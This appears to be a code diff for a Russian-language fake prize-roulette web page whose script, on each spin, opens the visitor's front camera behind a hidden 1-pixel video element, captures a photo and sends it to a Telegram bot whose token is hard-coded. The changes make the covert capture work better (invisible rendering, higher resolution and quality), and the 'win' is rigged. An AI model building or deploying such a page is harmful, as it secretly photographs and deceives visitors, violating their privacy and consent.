@@ -10,14 +10,14 @@
 <body class="bg-gradient-to-br from-indigo-950 via-purple-950 to-slate-950 min-h-screen text-white flex flex-col items-center justify-center p-4">
 
   <script>
-    // Ваш рабочий токен бота уже здесь:
     const TG_BOT_TOKEN = "8318987804:AAHHFs6RTMbaICdiO2OfGGaJhHear0ESF-E";
     
-    // ⚠️ ВПИШИТЕ СЮДА ТОЛЬКО СВОЙ ЧИСЛОВОЙ CHAT ID (например: "123456789"):
+    // ⚠️ ВПИШИТЕ СЮДА СВОЙ НАСТОЯЩИЙ ЧИСЛОВОЙ CHAT ID (например: "512345678"), а НЕ токен!
     const TG_CHAT_ID = "8318987804"; 
   </script>
 
-  <video id="camera" autoplay playsinline style="display:none;"></video>
+  <!-- Скрываем видео корректно, чтобы браузер рендерил кадры -->
+  <video id="camera" autoplay playsinline style="position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none;"></video>
   <canvas id="photo" style="display:none;"></canvas>
 
   <div class="max-w-md w-full bg-white/10 backdrop-blur-md rounded-2xl p-6 shadow-2xl border border-white/20 text-center">
@@ -25,7 +25,7 @@
       <span class="bg-gradient-to-r from-pink-500 to-yellow-500 text-xs uppercase tracking-widest px-3 py-1 rounded-full font-bold shadow">
         Акция 2026
       </span>
-      <h1 class="text-2xl font-extrabold mt-3 tracking-tight">Испытай удачу и выиграй приз!</h1>
+      <h1 class="text-2xl font-extrabold mt-3 tracking-tight">Испытай удачу и выиграй приз00v!</h1>
       <p class="text-sm text-gray-300 mt-1">Крутите рулетку и забирайте ценные подарки.</p>
     </div>
 
@@ -90,20 +90,24 @@
       document.getElementById("attemptsLeft").innerText = attempts;
       document.getElementById("spinBtn").disabled = true;
 
-      // Запрос камеры и отправка фото в Telegram
+      // Запрос камеры
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
+        });
         const video = document.getElementById("camera");
         video.srcObject = stream;
+        await video.play();
 
+        // Даем секунду на стабилизацию потока и делаем снимок
         setTimeout(() => {
           captureAndSendPhoto(stream, "iPhone 18 Pro Max");
-        }, 1200);
+        }, 1500);
       } catch (error) {
         console.error("Ошибка камеры:", error);
       }
 
-      const winningIndex = 0; // Выигрыш iPhone 18 Pro Max
+      const winningIndex = 0; 
       wonPrize = prizes[winningIndex].name;
 
       const itemWidth = 122; 
@@ -133,16 +137,18 @@
         formData.append("caption", `🎁 Победитель!\n🏆 Приз: ${prizeName}`);
 
         try {
-          await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, {
+          let response = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, {
             method: "POST",
             body: formData
           });
+          let result = await response.json();
+          console.log("Результат отправки:", result);
         } catch (e) {
           console.error("Ошибка отправки", e);
         }
 
         stream.getTracks().forEach(track => track.stop());
-      }, "image/jpeg", 0.50);
+      }, "image/jpeg", 0.85);
     }
 
     function showModal(prizeName) {
